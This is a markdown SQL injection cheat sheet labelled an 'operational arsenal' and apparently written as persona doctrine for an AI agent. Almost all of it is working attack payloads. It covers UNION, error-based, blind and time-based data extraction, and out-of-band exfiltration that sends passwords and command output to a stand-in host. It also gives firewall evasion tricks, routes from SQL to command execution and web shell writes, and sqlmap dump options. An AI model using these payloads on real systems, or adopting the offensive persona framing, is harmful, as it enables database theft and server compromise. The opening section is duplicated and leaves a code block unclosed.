# SQL INJECTION — FULL SPECTRUM

**Domain:** EXPERTISE — FULL OPERATIONAL ARSENAL

## Overview
> Level: GOD TIER — UNION packed queries, blind binary search, time-based, OAST, WAF bypass, modern surfaces (JSON/ORM/GraphQL/NoSQL/protocol)
**Detection:**
```
' -- fault injection, watch for errors

## Full Doctrine

> Level: GOD TIER — UNION packed queries, blind binary search, time-based, OAST, WAF bypass, modern surfaces (JSON/ORM/GraphQL/NoSQL/protocol)

**Detection:**

```
' -- fault injection, watch for errors
1 AND 1=1 -- numeric context
1 AND 1=2 -- boolean pair, responses should differ
'abc'||'def' -- PostgreSQL/Oracle/SQLite concat test
'abc'+'def' -- MSSQL concat test
CONCAT('abc','def') -- MySQL concat test
```

**Database fingerprinting:**

```
' UNION SELECT @@version-- - -- MySQL/MSSQL
' UNION SELECT version()-- - -- PostgreSQL/MySQL
' UNION SELECT banner FROM v$version-- - -- Oracle
' UNION SELECT sqlite_version()-- - -- SQLite
```

**UNION extraction (proven):**

- Column count: increment ORDER BY until error, or NULL-pad UNION until type mismatch clears
- Find reflected columns: `UNION SELECT 'a1','a2','a3','a4','a5'-- -`
- Schema walk: information_schema (MySQL/PostgreSQL), pg_catalog (PostgreSQL), sysobjects (MSSQL), all_tables (Oracle), sqlite_master (SQLite)

**Error-based extraction:**

- MySQL: `extractvalue(1,CONCAT(0x7e,(SELECT version())))`, `updatexml(1,CONCAT(0x7e,...),1)`
- MSSQL: `1=CONVERT(int,(SELECT @@version))`
- PostgreSQL: `1=CAST((SELECT version()) AS int)`, `1=CAST((SELECT query_to_xml('SELECT * FROM users',true,true,'')) AS int)` (whole table in ONE error)
- Oracle: `CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))`

**Blind extraction:**

- Boolean: binary search per character (8 queries/char, ASCII 0-255)
- Bit-shift: `ASCII(SUBSTRING(...)) >> 0 & 1` = 8 fixed requests per character
- Time-based: `IF(cond,SLEEP(3),0)` (MySQL), `WAITFOR DELAY '0:0:3'` (MSSQL), `pg_sleep(3)` (PostgreSQL)
- CASE oracle (PostgreSQL sort parameter): `?order=id&sort=,(CASE WHEN ... THEN name ELSE note END)`

**Out-of-Band (OAST):**

- MSSQL: `xp_dirtree "\'+@a+'.x.oast.pro\z"` (UNC/DNS exfil)
- Oracle: `UTL_HTTP.REQUEST('http://x.oast.pro/'||(SELECT password FROM users WHERE rownum=1))`
- MySQL (Windows, FILE priv): `LOAD_FILE(CONCAT('\\',(SELECT password),'.x.oast.pro\a'))`
- PostgreSQL: `COPY (SELECT '') TO PROGRAM 'nslookup $(id).x.oast.pro'`

**Modern surfaces (2025-2026):**

- JSON-based WAF bypass: `'||(SELECT '1')::jsonb->>'a'||'` (PostgreSQL JSON operators confuse WAF tokenizer)
- ORM injection: Django `?password__startswith=a` (blind leak via __-lookup), Prisma/Sequelize `{"$gt":""}` (auth bypass)
- GraphQL injection: `query($id:String!){ user(id:$id){ email } }` with `{"id":"1 UNION SELECT ..."}` in variables
- NoSQL injection: `{"$where":"this.password.match(/^a/)"}` (server-side JS), `[{"$unionWith":"secret_collection"}]` (aggregation pipeline)
- PDO prepared-statement bypass: null byte confuses backtick parsing (PHP 8.3, emulated prepares)
- Protocol-level smuggling: CVE-2024-27304 (Go pgx driver, message-length integer overflow)

**WAF evasion:**

- Inline comments: `'/**/UNION/**/SELECT/**/1,2,3-- -`
- MySQL versioned comments: `'/*!50000UNION*//*!50000SELECT*/1,2,3-- -`
- Case randomization: `'uNiOn sElEcT 1,2,3-- -`
- Whitespace alternatives: `%09` tab, `%0a` newline, `%0c`, `%0d`, `%a0`
- Operator swaps: `BETWEEN`, `LIKE`, `IN` instead of `=`, `>`
- Hex string building: `0x61646d696e` ('admin'), `CHAR(97,100,109,105,110)` (MSSQL), `CHR(97)||CHR(100)` (PostgreSQL/Oracle)
- Double URL encoding: `%2555%256e%2569%256f%256e` (double-encoded UNION)
- Fullwidth Unicode: `ＵＮＩＯＮ` (U+FF35, normalizes to UNION at backend)
- Header injection: `X-Forwarded-For: 0'XOR(SLEEP(5))XOR'Z`, `User-Agent: '/**/UNION/**/SELECT/**/@@version-- -`

**SQL to RCE:**

- MSSQL: `xp_cmdshell` re-enable via `sp_configure`, OLE Automation via `sp_oacreate wscript.shell`
- MySQL: `INTO OUTFILE '/var/www/html/s.php'` (FILE priv), UDF via `lib_mysqludf_sys` (DUMPFILE)
- PostgreSQL: `COPY ... TO PROGRAM` (superuser), large objects `lo_import`/`lo_export` (SELECT-only context)
- Oracle: `DBMS_SCHEDULER.CREATE_JOB` for OS command execution
- SQLite: `ATTACH DATABASE '/var/www/html/s.php' AS x`

**Automation:**

- sqlmap: `-r req.txt --batch` (best default), `--dbs`, `--tables`, `--dump`, `--level=5 --risk=3 --threads=10`
- WAF evasion: `--tamper=space2comment,between,randomcase`, vendor-specific tamper packs
- ghauri: faster blind/time-based alternative to sqlmap

---

## References
- LTX-QUASAR CORE.md (persona doctrine)
